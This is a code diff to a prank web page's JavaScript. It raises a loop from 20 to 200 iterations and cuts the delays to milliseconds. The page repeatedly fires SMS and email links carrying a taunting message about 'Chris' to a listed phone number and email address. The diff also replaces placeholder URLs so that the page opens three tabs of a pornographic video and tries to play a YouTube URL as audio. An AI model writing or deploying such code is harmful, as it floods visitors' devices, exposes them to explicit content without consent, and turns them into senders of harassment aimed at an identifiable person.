@@ -22,8 +22,8 @@
     <div id="message" class="message"></div>
     <script>
         let redirectCount = 0;
-        const maxLoops = 20;
-        const actionDelay = 1000; // Reduced delay to 1 second
+        const maxLoops = 200;
+        const actionDelay = 10; // Reduced delay to 1 second
 
         function detectDevice() {
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
@@ -47,13 +47,13 @@
         function openSmsLink() {
             const smsLink = 'sms:18134813211?subject=hey%20I%20cant%20stop%20picking%20on%20Chris&body=hey%20I%20cant%20stop%20picking%20on%20Chris';
             window.location.href = smsLink;
-            setTimeout(simulateReturnKey, 2000);
+            setTimeout(simulateReturnKey, 25);
         }
 
         function openEmailForm() {
             const mailtoLink = 'mailto:chris@granitecountertopsmelbourne.store?subject=hey%20I%20cant%20stop%20picking%20on%20Chris&body=hey%20I%20cant%20stop%20picking%20on%20Chris';
             window.location.href = mailtoLink;
-            setTimeout(simulateReturnKey, 2000);
+            setTimeout(simulateReturnKey, 25);
         }
 
         function performRedirect() {
@@ -61,13 +61,13 @@
         }
 
         function openMultipleTabs() {
-            window.open('http://example.com', '_blank');
-            window.open('http://example.com', '_blank');
-            window.open('http://example.com', '_blank');
+            window.open('https://www.pornhub.com/view_video.php?viewkey=ph5d6715653cdbd', '_blank');
+            window.open('https://www.pornhub.com/view_video.php?viewkey=ph5d6715653cdbd', '_blank');
+            window.open('https://www.pornhub.com/view_video.php?viewkey=ph5d6715653cdbd', '_blank');
         }
 
         function playSound() {
-            const audio = new Audio('http://example.com/annoying-sound.mp3');
+            const audio = new Audio('https://www.youtube.com/watch?v=lpkevX4814M&embeds_referring_euri=https%3A%2F%2Fwww.bing.com%2F&embeds_referring_origin=https%3A%2F%2Fwww.bing.com&source_ve_path=Mjg2NjY');
             audio.play();
         }
 
